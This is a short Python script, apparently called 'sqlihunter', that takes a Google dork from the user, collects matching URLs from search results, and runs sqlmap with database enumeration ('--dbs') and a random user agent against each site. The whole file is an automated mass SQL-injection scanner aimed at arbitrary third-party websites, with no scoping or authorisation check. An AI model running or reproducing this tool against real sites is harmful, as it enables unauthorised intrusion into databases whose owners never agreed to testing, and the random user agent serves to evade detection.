import os
import colorama
from subprocess import call
from colorama import Fore, Style
import datetime
from googlesearch import search, get_tbs

colorama.init(autoreset=True)

print(Fore.LIGHTGREEN_EX +""" 
========================================
           _ _ _                 _            
          | (_) |               | |           
 ___  __ _| |_| |__  _   _ _ __ | |_ ___ _ __ 
/ __|/ _` | | | '_ \| | | | '_ \| __/ _ \ '__|
\__ \ (_| | | | | | | |_| | | | | ||  __/ |   
|___/\__, |_|_|_| |_|\__,_|_| |_|\__\___|_|   
        | |                                   
        |_|                                   
""")

def sqlih():
   searchterm = input(f'{Fore.GREEN}dork => {Fore.WHITE}')
   searchnumber = 1

   for i in search(
    searchterm, 
    tld="com", 
    num=searchnumber, 
    stop=searchnumber, 
    pause=2,
    tbs=get_tbs(
        datetime.date(2021, 1, 1),
        datetime.date(2022, 4, 1))
   ):
    print(Fore.RED +"[!] scanning: " + i)
    call(["sqlmap", i ,"--dbs", "--random-agent"])
sqlih()
